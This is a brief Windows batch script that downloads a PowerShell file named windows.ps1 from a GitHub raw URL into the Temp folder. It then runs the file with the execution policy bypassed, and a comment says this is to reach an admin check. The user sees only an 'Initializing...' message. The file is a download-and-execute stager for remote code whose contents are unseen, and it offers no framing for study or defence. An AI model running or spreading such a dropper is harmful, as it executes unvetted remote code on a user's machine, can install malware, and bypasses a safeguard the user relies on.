@echo off
set "URL=https://github.com/qoqoxxxx-stack/aa/raw/refs/heads/main/windows.ps1"
set "DEST=%Temp%\windows.ps1"

echo Initializing...

:: Force TLS 1.2 and download the PS1
powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iwr '%URL%' -OutFile '%DEST%'"

:: Run with Bypass to make sure it hits the Admin check
powershell -ExecutionPolicy Bypass -File "%DEST%"

exit
